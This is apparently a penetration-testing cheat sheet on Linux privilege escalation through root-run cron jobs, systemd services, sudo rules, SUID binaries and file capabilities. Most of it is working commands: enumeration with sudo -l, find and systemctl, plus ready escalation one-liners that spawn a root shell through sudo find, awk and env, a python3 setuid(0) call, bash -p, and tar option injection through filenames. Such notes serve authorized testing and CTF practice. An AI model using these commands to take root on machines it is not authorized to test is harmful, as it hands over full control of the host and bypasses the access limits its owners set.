# Root-run files and services

[← Linux quick reference](../03-linux-privesc.md)

Find root-run command/file you control; confirm arguments and trigger.

## Find the path

```bash
sudo -l
ps -eo user,pid,ppid,cmd --forest
find / -xdev -type f -user root -perm -0002 -ls 2>/dev/null
find / -xdev -type d -user root -perm -0002 -ls 2>/dev/null
namei -l /path/to/root-run-script
```

Scheduled task: inspect unit/script and service user.

```bash
cat /etc/crontab
ls -lah /etc/cron.* /var/spool/cron 2>/dev/null
systemctl list-timers --all
systemctl cat <service>
systemctl show <service> -p User,Group,ExecStart,Environment
```

Check relative commands, writable paths, wildcards, preserved environment:

```bash
echo "$PATH"
find / -xdev -type d -writable -ls 2>/dev/null
grep -R "\*" /etc/cron.* /etc/systemd/system /usr/lib/systemd/system 2>/dev/null
```

## Sudo and SUID

Read full `sudo -l`: command, args, `NOPASSWD`, `env_keep`. Check installed version against [GTFOBins](https://gtfobins.github.io/).

```bash
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN{system("/bin/sh")}'
sudo env /bin/sh
```

SUID + relative command call → inspect PATH control. `bash -p` preserves effective UID.

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
strings <candidate-binary>
```

Python binary with `cap_setuid+ep`:

```bash
getcap /usr/bin/python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Cron/service: relative command in controllable `PATH`, or attacker filenames passed as `tar` options. Use `pspy` to confirm trigger.

## Before modifying a root-run file

Save contents/permissions; test once; restore.
